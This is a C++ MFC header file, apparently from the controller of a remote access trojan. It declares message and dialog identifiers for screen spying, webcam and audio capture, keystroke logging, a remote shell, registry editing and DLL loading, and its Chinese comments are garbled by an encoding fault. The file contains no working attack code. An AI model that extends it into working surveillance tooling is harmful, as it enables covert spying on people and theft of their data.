// stdafx.h : include file for standard system include files,
//  or project specific include files that are used frequently, but
//      are changed infrequently
//

#if !defined(AFX_STDAFX_H__4B858A7B_A54D_460A_A51B_CD810BB0B803__INCLUDED_)
#define AFX_STDAFX_H__4B858A7B_A54D_460A_A51B_CD810BB0B803__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#define VC_EXTRALEAN		// Exclude rarely-used stuff from Windows headers

#include <afxwin.h>         // MFC core and standard components
#include <afxext.h>         // MFC extensions
#include <afxcview.h>
#include <afxdisp.h>        // MFC Automation classes
#include <afxdtctl.h>		// MFC support for Internet Explorer 4 Common Controls
#ifndef _AFX_NO_AFXCMN_SUPPORT
#include <afxcmn.h>			// MFC support for Windows Common Controls
#endif // _AFX_NO_AFXCMN_SUPPORT

#include "XTToolkitPro.h"
#include <afxtempl.h>
#include <winsock2.h>
#include <winioctl.h>
#define MFCXLIB_STATIC 
#include "SkinH.h"
#pragma comment(lib, "SkinH.lib")
#include "include\IOCPServer.h"
#include "macros.h"
#include "vfw.h" // DrawDibOpen
#pragma comment(lib, "vfw32.lib")
#pragma comment(lib,"../common/libxvidcore.lib")  
#pragma comment(lib,"../common/zlib/zlib.lib")  
#pragma comment(lib, "legacy_stdio_definitions.lib")

enum 
{
	WM_CLIENT_CONNECT = WM_APP + 0x1001,
	WM_CLIENT_CLOSE,
	WM_CLIENT_NOTIFY,
	WM_DATA_IN_MSG,
	WM_DATA_OUT_MSG,

	
	WM_ADDTOLIST = WM_USER + 102,	// ���ӵ��б���ͼ��
	WM_REMOVEFROMLIST,				// ���б���ͼ��ɾ��
	WM_OPENMANAGERDIALOG,			// ��һ���ļ���������
	WM_OPENSCREENSPYDIALOG,			// ��һ����Ļ���Ӵ���
	WM_OPENWEBCAMDIALOG,			// ������ͷ���Ӵ���
	WM_OPENAUDIODIALOG,				// ��һ��������������
	WM_OPENKEYBOARDDIALOG,			// �򿪼��̼�¼����
	WM_OPENPSLISTDIALOG,			// �򿪽��̹�������
	WM_OPENSHELLDIALOG,				// ��shell����
	WM_RESETPORT,					// �ı�˿�
	WM_ADDFINDGROUP,				// ����ʱ���ҷ���
	WM_OPENSYSINFODIALOG,			// �򿪷�������Ϣ����
	WM_OPENREGEDITDIALOG,           // ��ע�����������
	WM_OPENDLLDLG,					// ��DLL����
	WM_MODIFYLIST,					// ɸѡ
	WM_NOMODIFYLIST,				// ɸѡ
//////////////////////////////////////////////////////////////////////////
	FILEMANAGER_DLG = 1,
	SCREENSPY_DLG,
	WEBCAM_DLG,
	AUDIO_DLG,
	KEYBOARD_DLG,
	SYSTEM_DLG,
	SHELL_DLG,
	SYSINFO_DLG,
	REGEDIT_DLG,
	DLL_DLG
};

typedef struct 
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;

#define MAKEINT64(low, high) ((unsigned __int64)(((DWORD)(low)) | ((unsigned __int64)((DWORD)(high))) << 32))

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_STDAFX_H__4B858A7B_A54D_460A_A51B_CD810BB0B803__INCLUDED_)